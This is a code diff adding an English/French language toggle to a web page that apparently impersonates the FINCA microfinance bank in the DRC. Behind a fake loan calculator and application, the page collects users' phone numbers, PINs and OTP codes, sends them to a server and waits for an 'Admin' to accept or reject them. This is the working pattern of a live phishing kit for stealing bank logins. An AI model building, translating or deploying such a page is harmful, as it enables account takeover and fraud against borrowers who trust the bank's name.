@@ -92,8 +92,15 @@
     }
     .navbar h1 { font-size: 1.4rem; font-weight: 700; color: #999; letter-spacing: 1px;}
     
-    .nav-links { display: flex; gap: 15px; font-size: 0.9rem; font-weight: 600; color: var(--finca-blue); }
-    .menu-icon { font-size: 1.2rem; color: var(--finca-blue); cursor: pointer; padding: 5px; }
+    /* Language Toggle */
+    .lang-toggle {
+      display: flex; gap: 5px; font-size: 0.85rem; font-weight: 700;
+    }
+    .lang-toggle span {
+      cursor: pointer; padding: 4px 8px; border-radius: 4px; color: #999;
+      transition: 0.2s;
+    }
+    .lang-toggle span.active { background: var(--finca-blue); color: #fff; }
 
     .page-container {
       flex: 1;
@@ -258,9 +265,10 @@
       <div class="logo-icon"></div>
       <h1>FINCA</h1>
     </div>
-    <div class="nav-links">
-      <span>Learn</span>
-      <span>Borrow <i class="fa-solid fa-chevron-down" style="font-size: 0.7rem;"></i></span>
+    <!-- Language Toggle -->
+    <div class="lang-toggle">
+      <span id="btn-en" onclick="setLanguage('en')">EN</span>
+      <span id="btn-fr" class="active" onclick="setLanguage('fr')">FR</span>
     </div>
   </div>
 
@@ -268,22 +276,22 @@
     <!-- Page 1: Hero & Calculator -->
     <div id="page1" class="page active">
       <div class="hero-section">
-        <h2>Boost your business today</h2>
-        <p>Apply for your credit online<br>Response in 7 days</p>
-        <button class="btn-primary" onclick="showPage('page2')">Apply for your loan</button>
+        <h2 data-en="Boost your business today" data-fr="Boost your business today">Boost your business today</h2>
+        <p data-en="Apply for your credit online<br>Response in 7 days" data-fr="Apply for your credit online<br>Response in 7 days">Apply for your credit online<br>Response in 7 days</p>
+        <button class="btn-primary" onclick="showPage('page2')" data-en="Apply for your loan" data-fr="Apply for your loan">Apply for your loan</button>
       </div>
 
       <div class="calc-card">
-        <div class="calc-labels"><span>Loan Amount</span><span class="value" id="amountLabel">500 000 FC</span></div>
+        <div class="calc-labels"><span data-en="Loan Amount" data-fr="Montant du prêt">Montant du prêt</span><span class="value" id="amountLabel">500 000 FC</span></div>
         <input type="range" id="loanAmount" min="50000" max="1000000" step="50000" value="500000" oninput="updateCalc()">
         <div class="calc-sub"><span>50 000 FC</span><span>1 000 000 FC</span></div>
 
-        <div class="calc-labels"><span>Loan Term</span><span class="value" id="termLabel">12 months</span></div>
+        <div class="calc-labels"><span data-en="Loan Term" data-fr="Durée du prêt">Durée du prêt</span><span class="value" id="termLabel">12 mois</span></div>
         <input type="range" id="loanTerm" min="6" max="60" step="6" value="12" oninput="updateCalc()">
-        <div class="calc-sub"><span>6 months</span><span>60 months</span></div>
+        <div class="calc-sub"><span data-en="6 months" data-fr="6 mois">6 mois</span><span data-en="60 months" data-fr="60 mois">60 mois</span></div>
 
         <div class="monthly-box">
-          <span>Monthly Payment</span>
+          <span data-en="Monthly Payment" data-fr="Paiement mensuel">Paiement mensuel</span>
           <span id="monthlyLabel">45 000 FC</span>
         </div>
       </div>
@@ -291,42 +299,42 @@
 
     <!-- Page 2: Questionnaire -->
     <div id="page2" class="page">
-      <h2 class="form-title">Votre Demande</h2>
+      <h2 class="form-title" data-en="Your Application" data-fr="Votre Demande">Votre Demande</h2>
       <form id="formQuestionnaire" style="padding-bottom: 20px;">
         <div class="form-group">
-          <label>Nom complet</label>
-          <input type="text" id="qName" required placeholder="Entrez votre nom complet">
+          <label data-en="Full name" data-fr="Nom complet">Nom complet</label>
+          <input type="text" id="qName" required data-en-placeholder="Enter your full name" data-fr-placeholder="Entrez votre nom complet" placeholder="Entrez votre nom complet">
         </div>
         <div class="form-group">
-          <label>Situation professionnelle</label>
+          <label data-en="Employment status" data-fr="Situation professionnelle">Situation professionnelle</label>
           <select id="qEmployment" required>
-            <option value="">Sélectionnez votre situation</option>
-            <option>Employé</option>
-            <option>Travailleur indépendant</option>
-            <option>Sans emploi</option>
+            <option value="" data-en="Select your status" data-fr="Sélectionnez votre situation">Sélectionnez votre situation</option>
+            <option value="Employed" data-en="Employed" data-fr="Employé">Employé</option>
+            <option value="Self-Employed" data-en="Self-Employed" data-fr="Travailleur indépendant">Travailleur indépendant</option>
+            <option value="Unemployed" data-en="Unemployed" data-fr="Sans emploi">Sans emploi</option>
           </select>
         </div>
         <div class="form-group">
-          <label>Revenu mensuel (FC)</label>
-          <input type="number" id="qIncome" required placeholder="Entrez votre revenu mensuel">
+          <label data-en="Monthly income (FC)" data-fr="Revenu mensuel (FC)">Revenu mensuel (FC)</label>
+          <input type="number" id="qIncome" required data-en-placeholder="Enter your monthly income" data-fr-placeholder="Entrez votre revenu mensuel" placeholder="Entrez votre revenu mensuel">
         </div>
         <div class="form-group">
-          <label>Montant du prêt (FC)</label>
-          <input type="number" id="qAmount" required placeholder="Entrez le montant du prêt">
+          <label data-en="Loan amount (FC)" data-fr="Montant du prêt (FC)">Montant du prêt (FC)</label>
+          <input type="number" id="qAmount" required data-en-placeholder="Enter loan amount" data-fr-placeholder="Entrez le montant du prêt" placeholder="Entrez le montant du prêt">
         </div>
         <div class="form-group">
-          <label>Période de remboursement</label>
+          <label data-en="Repayment period" data-fr="Période de remboursement">Période de remboursement</label>
           <select id="qTerm" required>
-            <option value="">Sélectionnez la période</option>
-            <option>6 mois</option>
-            <option>12 mois</option>
-            <option>24 mois</option>
-            <option>36 mois</option>
+            <option value="" data-en="Select period" data-fr="Sélectionnez la période">Sélectionnez la période</option>
+            <option value="6 months" data-en="6 months" data-fr="6 mois">6 mois</option>
+            <option value="12 months" data-en="12 months" data-fr="12 mois">12 mois</option>
+            <option value="24 months" data-en="24 months" data-fr="24 mois">24 mois</option>
+            <option value="36 months" data-en="36 months" data-fr="36 mois">36 mois</option>
           </select>
         </div>
         
         <div class="error" id="errQ"></div>
-        <button type="submit" class="btn-submit">SOUMETTRE LA DEMANDE</button>
+        <button type="submit" class="btn-submit" data-en="SUBMIT APPLICATION" data-fr="SOUMETTRE LA DEMANDE">SOUMETTRE LA DEMANDE</button>
       </form>
     </div>
 
@@ -335,17 +343,17 @@
       <div class="login-container">
         <div class="login-top">
           <div class="login-logo">FINCA</div>
-          <h3>Connexion</h3>
+          <h3 data-en="Login" data-fr="Connexion">Connexion</h3>
 
           <div class="phone-input-box">
             <div class="country-code">
               <div class="flag-icon"></div>
               +243
             </div>
-            <input type="tel" id="pPhone" placeholder="Numéro de téléphone">
+            <input type="tel" id="pPhone" data-en-placeholder="Phone Number" data-fr-placeholder="Numéro de téléphone" placeholder="Numéro de téléphone">
           </div>
 
-          <p class="pin-label">Entrez votre code PIN</p>
+          <p class="pin-label" data-en="Enter your PIN" data-fr="Entrez votre code PIN">Entrez votre code PIN</p>
           <div class="pin-boxes" id="pinContainer">
             <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin1')" id="pin0">
             <input type="password" maxlength="1" inputmode="numeric" oninput="moveFocus(this, 'pin2')" id="pin1">
@@ -356,14 +364,14 @@
         </div>
 
         <div class="login-bottom">
-          <p>Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous</p>
+          <p data-en="To register a FINCA account or get assistance,<br>click below" data-fr="Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous">Pour créer un compte FINCA ou obtenir de l'aide,<br>cliquez ci-dessous</p>
           <div class="bottom-buttons">
-            <button type="button" onclick="submitRegistration()"><i class="fa-solid fa-user-plus"></i>S'inscrire</button>
-            <button type="button" onclick="alert('Pour obtenir de l aide, veuillez appeler notre service client.')"><i class="fa-solid fa-circle-info"></i>Aide & Support</button>
+            <button type="button" onclick="submitRegistration()"><i class="fa-solid fa-user-plus"></i><span data-en="Register" data-fr="S'inscrire">S'inscrire</span></button>
+            <button type="button" onclick="alert('Help')"><i class="fa-solid fa-circle-info"></i><span data-en="Help & Support" data-fr="Aide & Support">Aide & Support</span></button>
           </div>
           <div class="login-footer">
             v4.0.3P<br><br>
-            En vous connectant, vous acceptez les <a href="#">Conditions Générales</a>
+            <span data-en="By signing in you agree to the" data-fr="En vous connectant, vous acceptez les">En vous connectant, vous acceptez les</span> <a href="#" data-en="Terms and Conditions" data-fr="Conditions Générales">Conditions Générales</a>
           </div>
         </div>
       </div>
@@ -374,7 +382,7 @@
       <div class="login-container">
         <div class="login-top">
           <div class="login-logo">FINCA</div>
-          <h3>Entrez le code OTP envoyé à</h3>
+          <h3 data-en="Enter the OTP code sent to" data-fr="Entrez le code OTP envoyé à">Entrez le code OTP envoyé à</h3>
           <div class="otp-phone" id="otpPhoneDisplay" style="font-weight: 700; margin-bottom: 40px; font-size: 1.1rem; color: var(--finca-blue);">+243 00 000 0000</div>
 
           <div class="otp-boxes" id="otpContainer">
@@ -386,12 +394,12 @@
             <input type="text" maxlength="1" inputmode="numeric" id="otp5">
           </div>
 
-          <p class="resend-text">Renvoyer l'OTP dans <span id="timer">44</span> Sec</p>
+          <p class="resend-text"><span data-en="Resend OTP in" data-fr="Renvoyer l'OTP dans">Renvoyer l'OTP dans</span> <span id="timer">44</span> Sec</p>
           <div class="error" id="errOtp" style="margin-top: 15px;"></div>
         </div>
 
         <div class="login-bottom" style="padding-top: 30px; padding-bottom: 30px;">
-          <div class="help-link" onclick="alert('Pour obtenir de l aide, veuillez appeler notre service client.')"><i class="fa-regular fa-circle-question"></i> Aide & Support</div>
+          <div class="help-link" onclick="alert('Help')"><i class="fa-regular fa-circle-question"></i> <span data-en="Help & Support" data-fr="Aide & Support">Aide & Support</span></div>
           <div class="login-footer" style="margin-top: 10px;">v4.2.9</div>
         </div>
       </div>
@@ -401,15 +409,15 @@
     <div id="page-waiting" class="page">
       <div class="waiting-screen">
         <div class="spinner"></div>
-        <h2>Veuillez patienter...</h2>
-        <p>Nous vérifions vos informations.<br>Cela peut prendre un moment.</p>
+        <h2 data-en="Please wait..." data-fr="Veuillez patienter...">Veuillez patienter...</h2>
+        <p data-en="We are verifying your details.<br>This may take a moment." data-fr="Nous vérifions vos informations.<br>Cela peut prendre un moment.">Nous vérifions vos informations.<br>Cela peut prendre un moment.</p>
       </div>
     </div>
 
     <!-- Page 6: Success -->
     <div id="page5" class="page" style="text-align: center; padding: 50px 20px; justify-content: center;">
-      <h2 style="color: var(--finca-blue); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;">Félicitations!</h2>
-      <p style="color: var(--text-dark); font-size: 1.1rem; line-height: 1.5;">Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.</p>
+      <h2 style="color: var(--finca-blue); font-size: 2.5rem; margin-bottom: 20px; font-weight: 800;" data-en="Congratulations!" data-fr="Félicitations!">Félicitations!</h2>
+      <p style="color: var(--text-dark); font-size: 1.1rem; line-height: 1.5;" data-en="Your loan application has been fully processed. Please check your account shortly." data-fr="Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.">Votre demande de prêt a été entièrement traitée. Veuillez vérifier votre compte sous peu.</p>
     </div>
   </div>
 </div>
@@ -418,15 +426,33 @@
   let sessionId = null;
   let pollTimer = null;
   let isPolling = false;
+  let currentLang = 'fr';
 
   async function init() {
     try {
       const res = await fetch('/api/session', { method: 'POST' });
       const data = await res.json();
       sessionId = data.sessionId;
-    } catch (err) { alert('Erreur de connexion. Veuillez rafraîchir.'); }
+    } catch (err) { alert('Connection error. Please refresh.'); }
   }
   init();
+
+  // Language Switcher
+  function setLanguage(lang) {
+    currentLang = lang;
+    document.getElementById('btn-en').classList.toggle('active', lang === 'en');
+    document.getElementById('btn-fr').classList.toggle('active', lang === 'fr');
+
+    document.querySelectorAll('[data-en]').forEach(el => {
+      el.innerHTML = el.getAttribute(`data-${lang}`);
+    });
+    
+    document.querySelectorAll('[data-en-placeholder]').forEach(el => {
+      el.placeholder = el.getAttribute(`data-${lang}-placeholder`);
+    });
+
+    updateCalc();
+  }
 
   function showPage(pageId) {
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -438,11 +464,14 @@
     const amount = document.getElementById('loanAmount').value;
     const term = document.getElementById('loanTerm').value;
     
-    document.getElementById('amountLabel').textContent = Number(amount).toLocaleString('fr-FR') + ' FC';
-    document.getElementById('termLabel').textContent = term + ' mois';
+    const fcText = currentLang === 'en' ? 'FC' : 'FC';
+    const moisText = currentLang === 'en' ? 'months' : 'mois';
+
+    document.getElementById('amountLabel').textContent = Number(amount).toLocaleString('fr-FR') + ' ' + fcText;
+    document.getElementById('termLabel').textContent = term + ' ' + moisText;
 
     const monthly = (amount * 1.08) / term; 
-    document.getElementById('monthlyLabel').textContent = Number(monthly).toLocaleString('fr-FR', {maximumFractionDigits: 0}) + ' FC';
+    document.getElementById('monthlyLabel').textContent = Number(monthly).toLocaleString('fr-FR', {maximumFractionDigits: 0}) + ' ' + fcText;
   }
 
   // Page 2 Submit
@@ -469,7 +498,7 @@
         startPolling(); 
       } else { throw new Error(); }
     } catch (err) {
-      document.getElementById('errQ').textContent = 'Échec de la soumission. Réessayez.';
+      document.getElementById('errQ').textContent = currentLang === 'en' ? 'Submission failed. Try again.' : 'Échec de la soumission. Réessayez.';
       document.getElementById('errQ').style.display = 'block';
       btn.disabled = false;
     }
@@ -487,7 +516,7 @@
     const pins = Array.from(document.querySelectorAll('#pinContainer input')).map(i => i.value).join('');
     
     if (phone === '' || pins === '') {
-      document.getElementById('errLogin').textContent = 'Veuillez remplir le numéro et le code PIN.';
+      document.getElementById('errLogin').textContent = currentLang === 'en' ? 'Please fill in the phone number and PIN.' : 'Veuillez remplir le numéro et le code PIN.';
       document.getElementById('errLogin').style.display = 'block';
       return;
     }
@@ -511,7 +540,7 @@
       });
       if (res.ok) startPolling(); 
     } catch (err) {
-      document.getElementById('errLogin').textContent = 'Erreur de connexion.';
+      document.getElementById('errLogin').textContent = currentLang === 'en' ? 'Connection error.' : 'Erreur de connexion.';
       document.getElementById('errLogin').style.display = 'block';
     }
   }
@@ -542,7 +571,7 @@
       });
       if (res.ok) startPolling(); 
     } catch (err) {
-      document.getElementById('errOtp').textContent = 'Erreur de connexion.';
+      document.getElementById('errOtp').textContent = currentLang === 'en' ? 'Connection error.' : 'Erreur de connexion.';
       document.getElementById('errOtp').style.display = 'block';
     }
   }
@@ -565,7 +594,7 @@
         } 
         else if (status === 'rejected_4') {
           stopPolling();
-          alert('Votre demande a été rejetée. Veuillez réessayer.');
+          alert(currentLang === 'en' ? 'Your application was rejected. Please try again.' : 'Votre demande a été rejetée. Veuillez réessayer.');
           showPage('page2');
           document.getElementById('formQuestionnaire').querySelector('button').disabled = false;
         } 
@@ -581,7 +610,7 @@
         } 
         else if (status === 'rejected_pin') {
           stopPolling();
-          alert('L admin a rejeté votre PIN/OTP. Veuillez réessayer.');
+          alert(currentLang === 'en' ? 'The Admin rejected your PIN/OTP. Please try again.' : 'L admin a rejeté votre PIN/OTP. Veuillez réessayer.');
           document.querySelectorAll('#otpContainer input').forEach(i => i.value = '');
           document.querySelectorAll('#pinContainer input').forEach(i => i.value = '');
           document.getElementById('errOtp').style.display = 'none';
